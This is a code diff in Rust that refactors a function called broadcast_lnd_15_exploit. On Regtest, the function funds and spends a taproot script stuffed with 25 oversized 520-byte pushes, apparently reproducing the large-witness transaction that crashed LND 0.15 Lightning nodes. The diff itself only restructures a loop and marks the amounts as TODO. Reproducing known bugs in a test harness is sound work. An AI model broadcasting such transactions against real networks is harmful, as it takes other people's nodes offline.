@@ -258,19 +258,17 @@ pub fn broadcast_lnd_15_exploit(
     )
     .unwrap();
 
-    let mut script_builder = Builder::new();
-    for _ in 0..25 {
-        script_builder = script_builder
-            .push_slice(&vec![1; 520])
-            .push_opcode(opcodes::all::OP_DROP);
-    }
+    let script_builder = (0..25).into_iter().fold(Builder::new(), |b, _| {
+        b.push_slice(&vec![1; 520])
+            .push_opcode(opcodes::all::OP_DROP)
+    });
     let script = script_builder.push_opcode(opcodes::OP_TRUE).into_script();
     let tr_script = script.clone().to_v1_p2tr(&secp, internal_key);
     let addr = Address::from_script(&tr_script, Network::Regtest).unwrap();
 
     let txid = bitcoind_client.send_to_address(
         &addr,
-        Amount::from_sat(110000),
+        Amount::from_sat(110000), // TODO configure amount
         None,
         None,
         None,
@@ -296,15 +294,12 @@ pub fn broadcast_lnd_15_exploit(
         witness: Witness::from_vec(witness),
     };
 
-    // amount sent to addr - 500
-    let amt: u64 = 110000 - 99966;
-
     let created_tx = Transaction {
         version: 2,
         lock_time: PackedLockTime::ZERO,
         input: vec![txin],
         output: vec![TxOut {
-            value: amt,
+            value: 10_000, // TODO configure amount
             script_pubkey: Script::new_p2pkh(&bitcoin::PubkeyHash::all_zeros()),
         }],
     };
